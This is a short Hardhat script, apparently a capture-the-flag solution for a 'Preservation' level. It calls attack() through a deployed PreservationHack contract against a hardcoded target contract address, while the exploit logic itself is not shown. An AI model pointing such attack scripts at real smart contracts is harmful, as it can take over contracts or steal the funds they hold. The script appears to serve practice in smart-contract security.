const hre = require("hardhat");
const hackABI = require("../artifacts/contracts/PreservationHack.sol/PreservationHack.json").abi;

async function main() {

    const [deployer] = await hre.ethers.getSigners();
    console.log("Attacking using MetaMask account:", deployer.address); 

    const targetAddress = "0x4dB3d7b10506B3FE7Cd7FA356d425ACe9D0Ff1cc"
    const hackAddress = "0x180dB31F171C3522C57C53578d6C3227e221931C"
    const hackContract = new hre.ethers.Contract(hackAddress, hackABI, deployer);

    const result = await hackContract.attack(targetAddress);
    await result.wait();

    console.log("Attack executed, transaction hash:", result.hash);
  }

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
  });